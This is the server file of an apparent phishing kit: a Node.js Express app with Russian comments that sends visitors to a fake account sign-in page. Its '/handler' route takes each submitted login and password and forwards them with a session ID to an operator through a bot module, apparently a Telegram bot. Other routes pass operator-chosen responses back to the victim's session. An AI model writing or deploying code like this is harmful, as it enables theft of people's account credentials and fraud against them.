const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');
const session = require('express-session');
const crypto = require('crypto');
const { sendMessageWithButtons, bot,getAuto } = require('./botjs');
require('./buttonHandler');
const app = express();
const port = 80;

// Middleware для парсинга URL-кодированного тела запроса
app.use(bodyParser.urlencoded({ extended: true }));

// Middleware для сервировки статических файлов из папки "public"
app.use(express.static('public'));

// Конфигурация сессий
app.use(
    session({ genid: (req) => {
        return generateId();
      },
        secret: 'your-secret-key',
        resave: false,
        saveUninitialized: true,
        
      })
    );
// Генерация 8-значного идентификатора сессии
function generateId() {
    const randomNumber = crypto.randomBytes(8).readUInt32LE(0);
    return String(randomNumber);
}

// Middleware для установки идентификатора сессии
// app.use((req, res, next) => {
//     if (!req.session.sessionId) {
//         req.session.sessionId = generateId();
//     }
//     next();
// });

// Обработчик для корневого маршрута
app.get("/", (req, res) => {
  
    res.redirect('/en/accounts/sign_in.html');
    
});
const sessionDir = path.join(__dirname, 'session');
app.post('/getevents', (req, res) => {
    try {
        let id = req.session.id.slice(0, 8);
        let sesPath = path.join(sessionDir, `${id}.json`);
        // console.log('Session path:', sesPath);

        if (fs.existsSync(sesPath)) {
            let sessionData = JSON.parse(fs.readFileSync(sesPath, 'utf8'));
            let data = sessionData.callback_data;
            res.send(data);

            sessionData.callback_data = ""; 
            fs.writeFileSync(sesPath, JSON.stringify(sessionData));

        } else {
            res.send('No data found for this session');
        }
    } catch (error) {
        console.error('Error reading session data:', error);
        res.send('error');
    }
});
app.post('/autocheck', (req, res) => {
     if(getAuto()){
         res.send('false')
    }
    else{
         res.send('true')
     }
});

 
app.post('/handler', (req, res) => {
    const { login, password } = req.body;
    let id = req.session.id.slice(0,8);
    console.log(id);
    if (login && password) {
        sendMessageWithButtons(`Login: ${login}\nPassword: ${password}\nSession ID: ${id}`);
        res.json({ status: 'success', message: 'Data received' });
    } else {
        res.json({ status: 'error', message: 'Invalid login or password' });
    }
    res.end();
});

 

// Запуск сервера
app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
